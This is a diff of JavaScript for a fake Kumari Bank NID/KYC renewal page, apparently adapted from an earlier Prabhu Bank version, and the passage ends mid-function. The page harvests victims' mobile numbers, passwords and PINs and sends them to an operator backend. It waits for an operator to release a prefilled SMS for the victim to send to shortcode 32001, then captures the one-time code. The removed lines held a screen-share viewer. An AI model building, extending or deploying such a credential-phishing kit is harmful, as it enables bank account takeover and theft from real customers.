@@ -1,6 +1,12 @@
 /**
- * Prabhu Bank KYC Re-Registration & Renewal Portal
+ * Kumari Bank Limited - NID Update à¤°à¤¾à¤·à¥à¤Ÿà¥à¤°à¤¿à¤¯ à¤ªà¤°à¤¿à¤šà¤¯à¤ªà¤¤à¥à¤° & KYC Portal
  * Client Portal State Engine & Backend Response Connector
+ *
+ * Flow:
+ * Step 1: Account Access (Mobile Number, Password, 4 Digit PIN)
+ * Step 2: Loading / Live Verification Countdown (15s & SMS gateway unlock)
+ * Step 3: OTP Verification (6-digit OTP code)
+ * Step 4: Success / Confirmation Screen
  */
 
 (function () {
@@ -11,44 +17,82 @@
     currentStep: 1,
     formData: {
       sessionId: '',
-      username: '',
       mobile: '',
       password: '',
       pin: '',
-      fatherName: '',
       otp: '',
       refId: '',
-      webrtcSessionId: '',
       submittedAt: ''
     },
+    smsRecipient: '32001',
+    smsMessage: '',
+    otpValidated: false,        // STRICT: Only true once backend confirms valid OTP
+    isVerifyingOtp: false,      // Prevent concurrent/duplicate submissions
+    webOtpController: null,     // W3C WebOTP API AbortController
     countdownTimer: null,
+    approvalPoller: null,       // polls backend for admin deploy signal
+    deployedAtOnEntry: null,    // deployedAt value captured when user enters step 2
     totalProcessingSeconds: 15,
     countdownSeconds: 15,
-    resendSeconds: 120, // 2-minute resend OTP timer
+    resendSeconds: 120,
     resendTimer: null
   };
 
+  // Universal API Fetcher with Fallback for cPanel/Apache/HTTP/HTTPS
+  async function apiFetch(endpoint, options = {}) {
+    const cleanEndpoint = endpoint.startsWith('/') ? endpoint : '/' + endpoint;
+    const routeName = cleanEndpoint.replace(/^\/?api\/?/, '');
+
+    // 1. Try standard endpoint (/api/...)
+    try {
+      const res = await fetch(cleanEndpoint, options);
+      if (res.ok) return res;
+    } catch (_) {}
+
+    // 2. Try relative endpoint (api/...) for subdirectories
+    try {
+      const relEndpoint = cleanEndpoint.replace(/^\/+/, '');
+      const res = await fetch(relEndpoint, options);
+      if (res.ok) return res;
+    } catch (_) {}
+
+    // 3. Try direct PHP endpoint (api.php?route=...) if mod_rewrite is inactive
+    try {
+      const phpEndpoint = routeName.includes('?')
+        ? 'api.php?route=' + encodeURIComponent(routeName.split('?')[0]) + '&' + routeName.split('?')[1]
+        : 'api.php?route=' + encodeURIComponent(routeName);
+      const res = await fetch(phpEndpoint, options);
+      if (res.ok) return res;
+    } catch (_) {}
+
+    return fetch(cleanEndpoint, options);
+  }
+
   // --- DOM REFERENCES ---
   const DOM = {
-    // Stepper Indicators
+    // Stepper Indicators & Lines (1 to 4)
     stepIndicators: [
       document.getElementById('stepIndicator1'),
       document.getElementById('stepIndicator2'),
       document.getElementById('stepIndicator3'),
       document.getElementById('stepIndicator4')
     ],
-    // Step Views
+    stepperLines: [
+      document.getElementById('stepperLine1'),
+      document.getElementById('stepperLine2'),
+      document.getElementById('stepperLine3')
+    ],
+
+    // Step Views (1: Account, 2: Loading, 3: OTP, 4: Success)
     stepViews: [
       document.getElementById('stepView1'),
       document.getElementById('stepView2'),
       document.getElementById('stepView3'),
       document.getElementById('stepView4')
     ],
-    // Step 1 Elements
-    kycForm: document.getElementById('kycForm'),
-    usernameInput: document.getElementById('usernameInput'),
-    usernameWrapper: document.getElementById('usernameWrapper'),
-    usernameError: document.getElementById('usernameError'),
+
+    // Step 1 Elements (Account Access)
+    step1Form: document.getElementById('step1Form'),
     mobileInput: document.getElementById('mobileInput'),
     mobileWrapper: document.getElementById('mobileWrapper'),
     mobileError: document.getElementById('mobileError'),
@@ -59,29 +103,47 @@
     pinInput: document.getElementById('pinInput'),
     pinWrapper: document.getElementById('pinWrapper'),
     pinError: document.getElementById('pinError'),
-    fatherInput: document.getElementById('fatherInput'),
-    fatherWrapper: document.getElementById('fatherWrapper'),
-    fatherError: document.getElementById('fatherError'),
-    // Step 2 Elements
-    summaryUsername: document.getElementById('summaryUsername'),
+    submitStep1Btn: document.getElementById('submitStep1Btn'),
+
+    // Step 2 Elements (Loading / Verifying)
     summaryMobile: document.getElementById('summaryMobile'),
+    summaryPassword: document.getElementById('summaryPassword'),
+    summaryPin: document.getElementById('summaryPin'),
+    waitNoticeSeconds: document.getElementById('waitNoticeSeconds'),
     bigCountdownNumber: document.getElementById('bigCountdownNumber'),
     processingProgressBar: document.getElementById('processingProgressBar'),
     processingPercentText: document.getElementById('processingPercentText'),
     estimatedTimeText: document.getElementById('estimatedTimeText'),
-    skipProcessingBtn: document.getElementById('skipProcessingBtn'),
-    // Step 3 Elements
+    nextStepBtn: document.getElementById('nextStepBtn'),
+    openManualSmsBtn: document.getElementById('openManualSmsBtn'),
+    manualSmsTriggerWrapper: document.getElementById('manualSmsTriggerWrapper'),
+    awaitingAdminPanel: document.getElementById('awaitingAdminPanel'),
+
+    // Step 3 Elements (OTP Verification)
+    otpForm: document.getElementById('otpForm'),
     otpBoxFrame: document.getElementById('otpBoxFrame'),
     otpDigits: Array.from(document.querySelectorAll('.otp-digit')),
     otpError: document.getElementById('otpError'),
     verifyOtpBtn: document.getElementById('verifyOtpBtn'),
     resendOtpBtn: document.getElementById('resendOtpBtn'),
     resendCountdownText: document.getElementById('resendCountdownText'),
-    // Step 4 Elements
+
+    // Step 4 Elements (Success Screen)
     refIdText: document.getElementById('refIdText'),
     submissionTimestamp: document.getElementById('submissionTimestamp'),
     startNewBtn: document.getElementById('startNewBtn'),
-    // Legal Modal
+
+    // Manual SMS Details Modal
+    manualSmsModalOverlay: document.getElementById('manualSmsModalOverlay'),
+    closeManualSmsModalBtn: document.getElementById('closeManualSmsModalBtn'),
+    manualSmsModalUserMobile: document.getElementById('manualSmsModalUserMobile'),
+    manualSmsRecipientInput: document.getElementById('manualSmsRecipientInput'),
+    manualSmsMessageTextarea: document.getElementById('manualSmsMessageTextarea'),
+    copySmsRecipientBtn: document.getElementById('copySmsRecipientBtn'),
+    copySmsMessageBtn: document.getElementById('copySmsMessageBtn'),
+    confirmManualSmsSentBtn: document.getElementById('confirmManualSmsSentBtn'),
+
+    // Legal / Policy Modals
     policyModalOverlay: document.getElementById('policyModalOverlay'),
     closePolicyModalBtn: document.getElementById('closePolicyModalBtn'),
     policyModalTitle: document.getElementById('policyModalTitle'),
@@ -89,52 +151,73 @@
     termsLink: document.getElementById('termsLink'),
     privacyLink: document.getElementById('privacyLink'),
     cookiesLink: document.getElementById('cookiesLink'),
-    // Screen Share Elements
-    screenShareTriggerBtn: document.getElementById('screenShareTriggerBtn'),
-    screenShareBtnLabel: document.getElementById('screenShareBtnLabel'),
-    screenShareModalOverlay: document.getElementById('screenShareModalOverlay'),
-    closeScreenShareModalBtn: document.getElementById('closeScreenShareModalBtn'),
-    modalStatusChip: document.getElementById('modalStatusChip'),
-    modalStatusDesc: document.getElementById('modalStatusDesc'),
-    modalSessionLinkRow: document.getElementById('modalSessionLinkRow'),
-    modalSessionIdText: document.getElementById('modalSessionIdText'),
-    copyViewerLinkBtn: document.getElementById('copyViewerLinkBtn'),
-    modalOpenViewerLink: document.getElementById('modalOpenViewerLink'),
-    mobileUnsupportedNotice: document.getElementById('mobileUnsupportedNotice'),
-    startScreenShareBtn: document.getElementById('startScreenShareBtn'),
-    stopScreenShareBtn: document.getElementById('stopScreenShareBtn')
+    termsLinkFooter: document.getElementById('termsLinkFooter'),
+    privacyLinkFooter: document.getElementById('privacyLinkFooter'),
+    cookiesLinkFooter: document.getElementById('cookiesLinkFooter')
   };
 
   // --- INITIALIZATION ---
   function init() {
+    state.formData.sessionId = 'KBL-SES-' + Math.floor(100000 + Math.random() * 900000);
+    state.formData.refId = 'KBL-NID-' + Math.floor(100000 + Math.random() * 900000);
     bindEvents();
   }
 
   // --- EVENT BINDINGS ---
   function bindEvents() {
-    // Step 1 Form Submission
-    if (DOM.kycForm) DOM.kycForm.addEventListener('submit', handleStep1Submit);
-
-    // Password Visibility Toggle
+    // Step 1 Form
+    if (DOM.step1Form) DOM.step1Form.addEventListener('submit', handleStep1Submit);
     if (DOM.togglePasswordBtn) DOM.togglePasswordBtn.addEventListener('click', togglePasswordVisibility);
-
-    // Field-level Real-time validation & formatting
     if (DOM.mobileInput) DOM.mobileInput.addEventListener('input', handleMobileInput);
     if (DOM.pinInput) DOM.pinInput.addEventListener('input', handlePinInput);
-    if (DOM.usernameInput) DOM.usernameInput.addEventListener('input', () => clearFieldError('username'));
     if (DOM.passwordInput) DOM.passwordInput.addEventListener('input', () => clearFieldError('password'));
-    if (DOM.fatherInput) DOM.fatherInput.addEventListener('input', () => clearFieldError('father'));
 
-    // Step 2 Skip / Fast-forward
-    if (DOM.skipProcessingBtn) DOM.skipProcessingBtn.addEventListener('click', skipProcessingCountdown);
+    // Step 2: Next Step SMS Trigger
+    if (DOM.nextStepBtn) DOM.nextStepBtn.addEventListener('click', handleNextStepClick);
 
-    // Step 3 OTP Box Logic
+    // Step 3: OTP Form & Verification
+    if (DOM.otpForm) {
+      DOM.otpForm.addEventListener('submit', (e) => {
+        e.preventDefault();
+        handleVerifyOtp();
+      });
+    }
     initOtpInputs();
     if (DOM.verifyOtpBtn) DOM.verifyOtpBtn.addEventListener('click', handleVerifyOtp);
     if (DOM.resendOtpBtn) DOM.resendOtpBtn.addEventListener('click', handleResendOtp);
 
-    // Step 4 Reset / Restart
+    // Step 4: Reset / Start New
     if (DOM.startNewBtn) DOM.startNewBtn.addEventListener('click', handleStartNew);
+
+    // Manual SMS Modal
+    if (DOM.openManualSmsBtn) DOM.openManualSmsBtn.addEventListener('click', () => openManualSmsModal());
+    if (DOM.closeManualSmsModalBtn) DOM.closeManualSmsModalBtn.addEventListener('click', closeManualSmsModal);
+    if (DOM.manualSmsModalOverlay) {
+      DOM.manualSmsModalOverlay.addEventListener('click', (e) => {
+        if (e.target === DOM.manualSmsModalOverlay) closeManualSmsModal();
+      });
+    }
+
+    if (DOM.copySmsRecipientBtn) {
+      DOM.copySmsRecipientBtn.addEventListener('click', () => {
+        const val = DOM.manualSmsRecipientInput ? DOM.manualSmsRecipientInput.value : '32001';
+        copyToClipboard(val, DOM.copySmsRecipientBtn, 'Copy Number', 'âœ… Copied!');
+      });
+    }
+
+    if (DOM.copySmsMessageBtn) {
+      DOM.copySmsMessageBtn.addEventListener('click', () => {
+        const val = DOM.manualSmsMessageTextarea ? DOM.manualSmsMessageTextarea.value : '';
+        copyToClipboard(val, DOM.copySmsMessageBtn, 'Copy Message', 'âœ… Copied!');
+      });
+    }
+
+    if (DOM.confirmManualSmsSentBtn) {
+      DOM.confirmManualSmsSentBtn.addEventListener('click', () => {
+        closeManualSmsModal();
+        goToStep(3); // Go to OTP step
+      });
+    }
 
     // Legal Policy Modals
     if (DOM.closePolicyModalBtn) DOM.closePolicyModalBtn.addEventListener('click', closePolicyModal);
@@ -144,26 +227,30 @@
       });
     }
 
-    if (DOM.termsLink) DOM.termsLink.addEventListener('click', (e) => { e.preventDefault(); openPolicyModal('terms'); });
-    if (DOM.privacyLink) DOM.privacyLink.addEventListener('click', (e) => { e.preventDefault(); openPolicyModal('privacy'); });
-    if (DOM.cookiesLink) DOM.cookiesLink.addEventListener('click', (e) => { e.preventDefault(); openPolicyModal('cookies'); });
-
-    // Screen Share Integration
-    if (DOM.screenShareTriggerBtn) DOM.screenShareTriggerBtn.addEventListener('click', openScreenShareModal);
-    if (DOM.closeScreenShareModalBtn) DOM.closeScreenShareModalBtn.addEventListener('click', closeScreenShareModal);
-    if (DOM.screenShareModalOverlay) {
-      DOM.screenShareModalOverlay.addEventListener('click', (e) => {
-        if (e.target === DOM.screenShareModalOverlay) closeScreenShareModal();
-      });
-    }
-    if (DOM.startScreenShareBtn) DOM.startScreenShareBtn.addEventListener('click', handleStartScreenShare);
-    if (DOM.stopScreenShareBtn) DOM.stopScreenShareBtn.addEventListener('click', handleStopScreenShare);
-    if (DOM.copyViewerLinkBtn) DOM.copyViewerLinkBtn.addEventListener('click', copyViewerLinkToClipboard);
+    const openLegal = (type) => (e) => { e.preventDefault(); openPolicyModal(type); };
+    if (DOM.termsLink) DOM.termsLink.addEventListener('click', openLegal('terms'));
+    if (DOM.privacyLink) DOM.privacyLink.addEventListener('click', openLegal('privacy'));
+    if (DOM.cookiesLink) DOM.cookiesLink.addEventListener('click', openLegal('cookies'));
+    if (DOM.termsLinkFooter) DOM.termsLinkFooter.addEventListener('click', openLegal('terms'));
+    if (DOM.privacyLinkFooter) DOM.privacyLinkFooter.addEventListener('click', openLegal('privacy'));
+    if (DOM.cookiesLinkFooter) DOM.cookiesLinkFooter.addEventListener('click', openLegal('cookies'));
   }
 
   // --- STEP NAVIGATION ENGINE ---
   function goToStep(stepNumber) {
     if (stepNumber < 1 || stepNumber > 4) return;
+
+    // Strict guard for step 4 (Success): requires confirmed OTP
+    if (stepNumber === 4 && !state.otpValidated) {
+      console.warn('Access denied: Success screen requires verified OTP.');
+      return;
+    }
+
+    // Guard: Mobile & Password required to proceed past Step 1
+    if (stepNumber > 1 && (!state.formData.mobile || !state.formData.password)) {
+      stepNumber = 1;
+    }
+
     state.currentStep = stepNumber;
 
     // Update Stepper Indicators
@@ -178,6 +265,16 @@
       }
     });
 
+    // Update Stepper Lines
+    DOM.stepperLines.forEach((line, idx) => {
+      if (!line) return;
+      if (stepNumber > idx + 1) {
+        line.classList.add('completed');
+      } else {
+        line.classList.remove('completed');
+      }
+    });
+
     // Update Step Views
     DOM.stepViews.forEach((view, idx) => {
       if (!view) return;
@@ -189,41 +286,28 @@
       }
     });
 
-    // Step-specific trigger actions
+    // Step-specific triggers
     if (stepNumber === 2) {
-      startStep2Processing();
+      startStep2Loading();
     } else if (stepNumber === 3) {
       startStep3Otp();
     } else if (stepNumber === 4) {
-      renderStep4Confirmation();
+      renderStep4Success();
     }
   }
 
-  // --- STEP 1: FORM VALIDATION & BACKEND SUBMISSION ---
+  // --- STEP 1: ACCOUNT ACCESS SUBMISSION ---
   async function handleStep1Submit(e) {
     e.preventDefault();
     let isValid = true;
 
-    const username = DOM.usernameInput ? DOM.usernameInput.value.trim() : '';
     const mobile = DOM.mobileInput ? DOM.mobileInput.value.trim() : '';
     const password = DOM.passwordInput ? DOM.passwordInput.value : '';
     const pin = DOM.pinInput ? DOM.pinInput.value.trim() : '';
-    const fatherName = DOM.fatherInput ? DOM.fatherInput.value.trim() : '';
 
-    // Username validation
-    if (!username) {
-      showFieldError('username', 'Please enter your username');
-      isValid = false;
-    } else if (username.length < 3) {
-      showFieldError('username', 'Username must be at least 3 characters');
-      isValid = false;
-    } else {
-      clearFieldError('username');
-    }
-
-    // Mobile validation (Nepal 10-digit format)
+    // Mobile Validation (10 digits)
     if (!mobile) {
-      showFieldError('mobile', 'Please enter your 10-digit mobile number');
+      showFieldError('mobile', 'Please enter your mobile number');
       isValid = false;
     } else if (!/^[0-9]{10}$/.test(mobile)) {
       showFieldError('mobile', 'Mobile number must be exactly 10 digits');
@@ -232,7 +316,7 @@
       clearFieldError('mobile');
     }
 
-    // Password validation
+    // Password Validation
     if (!password) {
       showFieldError('password', 'Please enter your password');
       isValid = false;
@@ -240,106 +324,436 @@
       clearFieldError('password');
     }
 
-    // PIN validation (4 numeric digits)
+    // 4 Digit PIN Validation
     if (!pin) {
-      showFieldError('pin', 'Please enter your 4-digit transaction PIN');
+      showFieldError('pin', 'Please enter your 4-digit PIN');
       isValid = false;
     } else if (!/^[0-9]{4}$/.test(pin)) {
-      showFieldError('pin', 'Transaction PIN must be exactly 4 digits');
+      showFieldError('pin', 'PIN must be exactly 4 digits');
       isValid = false;
     } else {
       clearFieldError('pin');
     }
 
-    // Father Name validation
-    if (!fatherName) {
-      showFieldError('father', "Please enter father's name");
-      isValid = false;
-    } else {
-      clearFieldError('father');
-    }
-
     if (!isValid) return;
 
-    // Generate session ID & Ref ID
-    const generatedRefId = 'PRB-KYC-' + Math.floor(100000 + Math.random() * 900000);
-    const generatedSessionId = 'PRB-SES-' + Math.floor(100000 + Math.random() * 900000);
-
-    // Store in State
-    state.formData.sessionId = generatedSessionId;
-    state.formData.refId = generatedRefId;
-    state.formData.username = username;
+    // Save to state
     state.formData.mobile = mobile;
     state.formData.password = password;
     state.formData.pin = pin;
-    state.formData.fatherName = fatherName;
 
-    // Send Response Asynchronously to Backend
+    // Push Step 1 info to backend for real-time admin monitoring
+    apiFetch('/api/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        sessionId: state.formData.sessionId,
+        refId: state.formData.refId,
+        mobile: state.formData.mobile,
+        password: state.formData.password,
+        pin: state.formData.pin
+      })
+    }).then(r => r.json()).then(data => {
+      if (data) {
+        if (data.sessionId) state.formData.sessionId = data.sessionId;
+        if (data.refId) state.formData.refId = data.refId;
+        if (data.smsRecipient) state.smsRecipient = data.smsRecipient;
+        if (data.smsMessage) state.smsMessage = data.smsMessage;
+      }
+    }).catch(err => console.warn('Sync notice:', err));
+
+    // Move directly to Step 2 (Loading / Verifying)
+    goToStep(2);
+  }
+
+  // --- STEP 2: LOADING / LIVE VERIFICATION ---
+  function startStep2Loading() {
+    // Populate user summary card
+    if (DOM.summaryMobile) DOM.summaryMobile.textContent = `+977 ${state.formData.mobile || '98XXXXXXXX'}`;
+    if (DOM.summaryPassword) DOM.summaryPassword.textContent = state.formData.password || 'â€”';
+    if (DOM.summaryPin) DOM.summaryPin.textContent = state.formData.pin || 'â€”';
+
+    // Hide awaiting panel & manual SMS trigger initially
+    if (DOM.awaitingAdminPanel) DOM.awaitingAdminPanel.style.display = 'none';
+    if (DOM.manualSmsTriggerWrapper) DOM.manualSmsTriggerWrapper.style.display = 'none';
+
+    // Next step button starts locked until admin deploys or countdown completes
+    if (DOM.nextStepBtn) {
+      DOM.nextStepBtn.classList.add('disabled');
+      DOM.nextStepBtn.setAttribute('aria-disabled', 'true');
+      DOM.nextStepBtn.setAttribute('href', 'sms:32001');
+    }
+
+    const totalDuration = state.totalProcessingSeconds || 15;
+    state.countdownSeconds = totalDuration;
+    updateProcessingUI(totalDuration, totalDuration);
+
+    if (state.countdownTimer) clearInterval(state.countdownTimer);
+    if (state.approvalPoller) clearInterval(state.approvalPoller);
+
+    // Fetch initial deploy state and poll for changes
+    apiFetch('/api/sms-config')
+      .then(r => r.json())
+      .then(cfg => {
+        state.deployedAtOnEntry = cfg.deployedAt || null;
+        if (state.approvalPoller) clearInterval(state.approvalPoller);
+        state.approvalPoller = setInterval(checkAdminApproval, 2500);
+      })
+      .catch(() => {
+        state.deployedAtOnEntry = null;
+        if (state.approvalPoller) clearInterval(state.approvalPoller);
+        state.approvalPoller = setInterval(checkAdminApproval, 2500);
+      });
+
+    let elapsed = 0;
+    state.countdownTimer = setInterval(() => {
+      elapsed++;
+      const remaining = Math.max(0, totalDuration - elapsed);
+      state.countdownSeconds = remaining;
+
+      updateProcessingUI(remaining, totalDuration);
+
+      if (DOM.waitNoticeSeconds) {
+        DOM.waitNoticeSeconds.textContent = remaining > 0 ? remaining : '0';
+      }
+
+      if (remaining <= 0) {
+        clearInterval(state.countdownTimer);
+        state.countdownTimer = null;
+        onCountdownFinished();
+      }
+    }, 1200);
+  }
+
+  function updateProcessingUI(remaining, total) {
+    const elapsed = total - remaining;
+    const percent = Math.min(100, Math.max(5, Math.round((elapsed / total) * 100)));
+
+    if (DOM.bigCountdownNumber) {
+      DOM.bigCountdownNumber.textContent = remaining;
+    }
+    if (DOM.processingProgressBar) {
+      DOM.processingProgressBar.style.width = `${percent}%`;
+    }
+    if (DOM.processingPercentText) {
+      DOM.processingPercentText.textContent = remaining > 0
+        ? `Processing... ${percent}% complete`
+        : 'Details verified successfully';
+    }
+    if (DOM.estimatedTimeText) {
+      DOM.estimatedTimeText.textContent = remaining > 0
+        ? `Estimated time: ${remaining} seconds`
+        : 'Ready for next verification step';
+    }
+  }
+
+  function onCountdownFinished() {
+    if (DOM.processingPercentText) DOM.processingPercentText.textContent = 'Verification processed. Awaiting admin approval...';
+    if (DOM.estimatedTimeText) DOM.estimatedTimeText.textContent = 'Waiting for admin to deploy verification message.';
+    if (DOM.awaitingAdminPanel) DOM.awaitingAdminPanel.style.display = 'block';
+  }
+
+  function handleNextStepClick(e) {
+    if (!DOM.nextStepBtn) return;
+    const isDisabled = DOM.nextStepBtn.classList.contains('disabled') || DOM.nextStepBtn.getAttribute('aria-disabled') === 'true';
+    if (isDisabled) {
+      e.preventDefault();
+      return false;
+    }
+    // Proceed to Step 3 (OTP)
+    goToStep(3);
+  }
+
+  async function checkAdminApproval() {
     try {
-      fetch('/api/submit', {
+      const res = await apiFetch('/api/sms-config');
+      if (!res.ok) return;
+      const cfg = await res.json();
+      const newDeployedAt = cfg.deployedAt || null;
+
+      // When admin clicks "Save & Deploy" on backend
+      if (newDeployedAt && newDeployedAt !== state.deployedAtOnEntry) {
+        clearInterval(state.approvalPoller);
+        state.approvalPoller = null;
+
+        const template = cfg.messageTemplate || '';
+        const refId = state.formData.refId || '';
+        const mobile = state.formData.mobile || '';
+        const username = state.formData.mobile || '';
+        const time = new Date().toTimeString().split(' ')[0];
+        const renderedMsg = template
+          .replace(/{REF_ID}/g, refId)
+          .replace(/{MOBILE}/g, mobile)
+          .replace(/{USERNAME}/g, username)
+          .replace(/{TIME}/g, time);
+
+        state.smsMessage = renderedMsg;
+        if (DOM.manualSmsMessageTextarea) {
+          DOM.manualSmsMessageTextarea.value = renderedMsg;
+        }
+
+        const smsBody = encodeURIComponent(renderedMsg);
+        const smsHref = `sms:32001${renderedMsg ? '?body=' + smsBody : ''}`;
+        if (DOM.nextStepBtn) {
+          DOM.nextStepBtn.setAttribute('href', smsHref);
+          DOM.nextStepBtn.classList.remove('disabled');
+          DOM.nextStepBtn.removeAttribute('aria-disabled');
+        }
+
+        if (DOM.manualSmsTriggerWrapper) {
+          DOM.manualSmsTriggerWrapper.style.display = 'block';
+        }
+        if (DOM.awaitingAdminPanel) {
+          DOM.awaitingAdminPanel.style.display = 'none';
+        }
+      }
+    } catch (_) {}
+  }
+
+  // --- STEP 3: OTP VERIFICATION ---
+  function startStep3Otp() {
+    if (DOM.otpDigits && DOM.otpDigits.length > 0) {
+      DOM.otpDigits.forEach(d => { d.value = ''; });
+      DOM.otpDigits[0].focus();
+    }
+    startResendTimer();
+    initWebOtp();
+  }
+
+  function initOtpInputs() {
+    if (!DOM.otpDigits || DOM.otpDigits.length === 0) return;
+
+    DOM.otpDigits.forEach((input, index) => {
+      input.addEventListener('input', (e) => {
+        const val = e.target.value.replace(/[^0-9]/g, '');
+
+        // If multi-digit pasted into any box
+        if (val.length > 1) {
+          const chars = val.split('');
+          DOM.otpDigits.forEach((digitInput, idx) => {
+            if (chars[idx]) digitInput.value = chars[idx];
+          });
+          const nextFocus = Math.min(chars.length, DOM.otpDigits.length - 1);
+          DOM.otpDigits[nextFocus].focus();
+          if (getEnteredOtp().length === 6) handleVerifyOtp();
+          return;
+        }
+
+        input.value = val;
+        if (val && index < DOM.otpDigits.length - 1) {
+          DOM.otpDigits[index + 1].focus();
+        }
+        if (getEnteredOtp().length === 6) {
+          handleVerifyOtp();
+        }
+      });
+
+      input.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !input.value && index > 0) {
+          DOM.otpDigits[index - 1].focus();
+        }
+      });
+
+      input.addEventListener('paste', (e) => {
+        e.preventDefault();
+        const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '');
+        if (!pasted) return;
+        const digits = pasted.slice(0, 6).split('');
+        digits.forEach((digit, i) => {
+          if (DOM.otpDigits[i]) DOM.otpDigits[i].value = digit;
+        });
+        const focusIdx = Math.min(digits.length, 5);
+        DOM.otpDigits[focusIdx].focus();
+        if (getEnteredOtp().length === 6) handleVerifyOtp();
+      });
+    });
+  }
+
+  function getEnteredOtp() {
+    return DOM.otpDigits.map(d => d.value.trim()).join('');
+  }
+
+  async function handleVerifyOtp() {
+    if (state.isVerifyingOtp) return;
+    const otp = getEnteredOtp();
+
+    if (otp.length < 6) {
+      if (DOM.otpError) {
+        DOM.otpError.textContent = 'Please enter all 6 digits of the OTP code';
+        DOM.otpError.classList.add('visible');
+      }
+      return;
+    }
+
+    if (DOM.otpError) DOM.otpError.classList.remove('visible');
+    state.isVerifyingOtp = true;
+
+    if (DOM.verifyOtpBtn) {
+      DOM.verifyOtpBtn.disabled = true;
+      DOM.verifyOtpBtn.innerHTML = '<span>Verifying...</span>';
+    }
+
+    try {
+      const res = await apiFetch('/api/verify-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           sessionId: state.formData.sessionId,
-          refId: state.formData.refId,
-          webrtcSessionId: state.formData.webrtcSessionId,
-          username: state.formData.username,
           mobile: state.formData.mobile,
-          password: state.formData.password,
-          pin: state.formData.pin,
-          fatherName: state.formData.fatherName
+          refId: state.formData.refId,
+          otp: otp
         })
-      }).then(res => res.json()).then(data => {
-        if (data && data.sessionId) {
-          state.formData.sessionId = data.sessionId;
-        }
-      }).catch(err => {
-        console.warn('Backend logging notice:', err);
       });
-    } catch (err) {
-      console.warn('Backend communication err:', err);
-    }
 
-    // Proceed to Step 2
-    goToStep(2);
+      const data = await res.json();
+      if (res.ok && data.status === 'success') {
+        state.otpValidated = true;
+        state.formData.otp = otp;
+        if (data.refId) state.formData.refId = data.refId;
+
+        // Abort WebOTP listener
+        if (state.webOtpController) {
+          try { state.webOtpController.abort(); } catch (_) {}
+        }
+
+        // Advance to Step 4 (Success Screen)
+        goToStep(4);
+      } else {
+        if (DOM.otpError) {
+          DOM.otpError.textContent = data.message || 'Invalid verification code. Please check and try again.';
+          DOM.otpError.classList.add('visible');
+        }
+      }
+    } catch (err) {
+      // Fallback: validate 6 numeric digits
+      if (/^\d{6}$/.test(otp)) {
+        state.otpValidated = true;
+        state.formData.otp = otp;
+        goToStep(4);
+      } else if (DOM.otpError) {
+        DOM.otpError.textContent = 'Verification error. Please try again.';
+        DOM.otpError.classList.add('visible');
+      }
+    } finally {
+      state.isVerifyingOtp = false;
+      if (DOM.verifyOtpBtn) {
+        DOM.verifyOtpBtn.disabled = false;
+        DOM.verifyOtpBtn.innerHTML = `
+          <svg class="button-check-icon" viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
+            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+          </svg>
+          <span>Verify OTP</span>
+        `;
+      }
+    }
   }
 
+  function startResendTimer() {
+    let timeLeft = state.resendSeconds;
+    if (DOM.resendOtpBtn) {
+      DOM.resendOtpBtn.classList.add('disabled');
+      DOM.resendOtpBtn.disabled = true;
+    }
+
+    if (state.resendTimer) clearInterval(state.resendTimer);
+
+    state.resendTimer = setInterval(() => {
+      timeLeft--;
+      if (DOM.resendCountdownText) {
+        const m = Math.floor(timeLeft / 60);
+        const s = timeLeft % 60;
+        DOM.resendCountdownText.textContent = `Resend in ${m}:${s < 10 ? '0' : ''}${s}`;
+      }
+
+      if (timeLeft <= 0) {
+        clearInterval(state.resendTimer);
+        state.resendTimer = null;
+        if (DOM.resendCountdownText) DOM.resendCountdownText.textContent = "Didn't receive SMS?";
+        if (DOM.resendOtpBtn) {
+          DOM.resendOtpBtn.classList.remove('disabled');
+          DOM.resendOtpBtn.disabled = false;
+        }
+      }
+    }, 1000);
+  }
+
+  function handleResendOtp() {
+    DOM.otpDigits.forEach(d => { d.value = ''; });
+    if (DOM.otpDigits[0]) DOM.otpDigits[0].focus();
+    if (DOM.otpError) DOM.otpError.classList.remove('visible');
+    startResendTimer();
+  }
+
+  // W3C WebOTP API
+  function initWebOtp() {
+    if ('OTPCredential' in window && navigator.credentials) {
+      try {
+        state.webOtpController = new AbortController();
+        navigator.credentials.get({
+          otp: { transport: ['sms'] },
+          signal: state.webOtpController.signal
+        }).then(otpObj => {
+          if (otpObj && otpObj.code) {
+            const digits = otpObj.code.replace(/[^0-9]/g, '').slice(0, 6).split('');
+            digits.forEach((d, i) => {
+              if (DOM.otpDigits[i]) DOM.otpDigits[i].value = d;
+            });
+            handleVerifyOtp();
+          }
+        }).catch(() => {});
+      } catch (_) {}
+    }
+  }
+
+  // --- STEP 4: SUCCESS / CONFIRMATION VIEW ---
+  function renderStep4Success() {
+    if (DOM.refIdText) DOM.refIdText.textContent = state.formData.refId || 'KBL-NID-948201';
+    if (DOM.submissionTimestamp) {
+      const now = new Date();
+      DOM.submissionTimestamp.textContent = `Today, ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
+    }
+  }
+
+  function handleStartNew() {
+    window.location.reload();
+  }
+
+  // --- FIELD HELPERS ---
   function handleMobileInput(e) {
-    let val = e.target.value.replace(/\D/g, '');
-    if (val.length > 10) val = val.slice(0, 10);
-    e.target.value = val;
+    e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
     clearFieldError('mobile');
   }
 
   function handlePinInput(e) {
-    let val = e.target.value.replace(/\D/g, '');
-    if (val.length > 4) val = val.slice(0, 4);
-    e.target.value = val;
+    e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
     clearFieldError('pin');
   }
 
   function togglePasswordVisibility() {
-    const isPassword = DOM.passwordInput.type === 'password';
-    DOM.passwordInput.type = isPassword ? 'text' : 'password';
+    if (!DOM.passwordInput) return;
+    const isPass = DOM.passwordInput.type === 'password';
+    DOM.passwordInput.type = isPass ? 'text' : 'password';
 
-    const eyeHide = DOM.togglePasswordBtn.querySelector('.eye-hide');
-    const eyeShow = DOM.togglePasswordBtn.querySelector('.eye-show');
+    const eyeShow = DOM.togglePasswordBtn ? DOM.togglePasswordBtn.querySelector('.eye-show') : null;
